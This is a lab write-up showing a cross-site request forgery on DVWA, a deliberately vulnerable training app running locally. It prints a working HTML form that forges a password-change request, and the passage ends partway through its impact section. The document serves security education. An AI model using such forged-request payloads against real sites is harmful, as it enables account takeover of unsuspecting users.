# Cross-Site Request Forgery (CSRF)

## Objective

To demonstrate a Cross-Site Request Forgery vulnerability in DVWA and implement token-based CSRF protection.

## Lab Environment

* Application: Damn Vulnerable Web Application (DVWA)
* Security Level: Low
* Web Server: Apache
* Operating System: Kali Linux

## 1. CSRF Attack

The DVWA CSRF module was tested while an authenticated DVWA session was active.

A separate local HTML page was created containing a forged password-change request:

```html
<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="CSRFtest123">
    <input type="hidden" name="password_conf" value="CSRFtest123">
    <input type="hidden" name="Change" value="Change">
    <input type="submit" value="Change Password">
</form>
```

When the request was submitted while authenticated to DVWA, the application accepted the forged request and changed the password.

The password was subsequently restored to the original test password.

## Impact

A CSRF vulnerability can allow an attacker to cause an authenticated user to perform an unwanted action without the user's intentional approval.

Examples include:

* Changing account settings.
* Changing passwords.
* Performing tran
